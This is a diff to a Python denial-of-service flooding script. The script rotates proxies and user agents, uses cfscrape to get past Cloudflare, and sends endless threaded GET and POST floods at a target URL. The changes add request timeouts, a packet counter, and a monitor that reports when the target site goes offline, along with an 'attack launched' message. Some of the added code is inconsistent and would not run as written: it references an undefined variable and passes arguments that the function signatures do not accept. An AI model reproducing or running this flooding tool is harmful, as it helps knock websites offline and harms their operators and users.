@@ -6,8 +6,6 @@ import requests
 import cfscrape
 import os
 import pyAesCrypt
-import time
-from numba import prange
 
 os.system("clear")
 
@@ -61,15 +59,15 @@ def dos1_1(target, proxy):
     }
 
     try:
-        s.get(target, headers=header, proxies=proxiessockshttp)
+        s.get(target, headers=header, proxies=proxiessockshttp, timeout=1)
     except:
         pass
 
     try:
-        s.post(target, headers=header2, proxies=proxiessockshttp)
+        s.post(target, headers=header2, proxies=proxiessockshttp, timeout=1)
     except:
         pass
-
+    pack += 1
 
 def dos1_2(target, proxy):
     s = cfscrape.create_scraper()
@@ -86,12 +84,12 @@ def dos1_2(target, proxy):
     }
 
     try:
-        s.get(target, headers=header, proxies=proxieshttphttp)
+        s.get(target, headers=header, proxies=proxieshttphttp, timeout=1)
     except:
         pass
 
     try:
-        s.post(target, headers=header2, proxies=proxieshttphttp)
+        s.post(target, headers=header2, proxies=proxieshttphttp, timeout=1)
     except:
         pass
 
@@ -106,6 +104,26 @@ def dos2(target):
         except:
             pass
 
+
+def info():
+    while True:
+        useragent = random.choice(headersp)
+        header = {'user-agent': useragent}
+
+        proxyagenthttp = random.choice(proxy_http)
+        proxieshttphttp = {
+            'http': f'http://{proxyagenthttp}',
+            'https': f'http://{proxyagenthttp}',
+        }
+        try:
+            checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
+            if checksite.status_code >= 500:
+                statustext = "OFF_LINE"
+            else:
+                statustext = "ON_LINE"
+        except:
+            pass
+        print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
 
 threads = 20
 print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
@@ -128,31 +146,14 @@ proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 if proxyuseage == 1:
+    print(colorama.Fore.GREEN + "Аттака запущена!")
+    print(Style.RESET_ALL)
+    threading.Thread(target=info)
     while True:
         for number_socks in proxy_http:
-            threading.Thread(target=dos1_1, args=(url, number_socks,)).start()
+            threading.Thread(target=dos1_1, args=(url, number_socks, packet)).start()
         for number_http in proxy_socks:
-            threading.Thread(target=dos1_2, args=(url, number_http,)).start()
+            threading.Thread(target=dos1_2, args=(url, number_http, packet)).start()
 else:
     while True:
         threading.Thread(target=dos2, args=(url,)).start()
-print(Style.RESET_ALL)
-
-while True:
-    useragent = random.choice(headersp)
-    header = {'user-agent': useragent}
-
-    proxyagenthttp = random.choice(proxy_http)
-    proxieshttphttp = {
-        'http': f'http://{proxyagenthttp}',
-        'https': f'http://{proxyagenthttp}',
-    }
-    try:
-        checksite = requests.post(url, headers=header, proxies=proxieshttphttp)
-        if checksite.status_code >= 500:
-            statustext = "OFF_LINE"
-        else:
-            statustext = "ON_LINE"
-    except:
-        pass
-    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
